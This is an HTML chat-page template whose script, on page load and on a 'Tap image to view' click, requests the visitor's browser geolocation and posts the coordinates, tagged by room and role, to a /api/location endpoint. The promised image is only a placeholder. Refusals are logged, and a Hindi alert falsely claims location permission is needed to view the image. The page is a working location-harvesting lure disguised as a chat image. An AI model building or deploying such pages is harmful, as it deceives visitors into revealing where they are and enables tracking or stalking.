<!DOCTYPE html>
<html>
<head>
  <title>{{ role }} Chat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/static/style.css">
</head>
<body class="bg-light">

<div class="container py-3">
  <h4 class="text-center">{{ role|upper }} CHAT</h4>

  <div class="card mt-4">
    <div class="card-body text-center">
      <img src="https://via.placeholder.com/300x180"
           class="img-fluid chat-image"
           onclick="sendLocation('image_click')">
      <p class="mt-2 text-muted">Tap image to view</p>
    </div>
  </div>
</div>

<script>
const room = "{{ room }}";
const role = "{{ role }}";

function sendLocation(action) {
  if (!navigator.geolocation) {
    sendDenied(action);
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      fetch("/api/location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          room, role,
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          status: "ALLOWED",
          action
        })
      });
    },
    err => {
      sendDenied(action);
      alert("Image dekhne ke liye location permission allow karna zaruri hai");
    }
  );
}

function sendDenied(action) {
  fetch("/api/location", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      room, role,
      lat: null,
      lng: null,
      status: "DENIED",
      action
    })
  });
}

// âœ… page load pe location
window.onload = () => sendLocation("page_load");
</script>

</body>
</html>
